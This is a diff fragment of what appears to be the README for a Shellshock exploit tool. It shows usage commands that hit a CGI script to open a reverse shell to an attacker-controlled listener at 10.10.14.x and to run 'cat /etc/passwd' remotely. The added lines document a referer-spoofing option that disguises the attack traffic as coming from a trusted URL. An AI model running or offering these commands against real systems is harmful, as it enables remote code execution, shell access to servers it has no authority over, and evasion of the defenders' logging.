@@ -27,3 +27,9 @@ python3 shellshock.py -u http://example.com -r /cgi-bin/time.sh -s -lh 10.10.14.
 ```
 python3 shellshock.py -u http://example.com -r /cgi-bin/time.sh -c 'cat /etc/passwd'
 ```
+
+<h3>If you want to make referer spoofing</h3>
+
+```
+Add the -R or --referer-spoof flag both for receiving a shell or executing remote commands, followed by a trustable URL, f. ex: https://www.google.com/search?q=cabecera+referer&oq=cabecera+referer&aqs=chrome..69i57j69i59l2j0l4j69i60.3531j0j7&sourceid=chrome&ie=UTF-8
+```
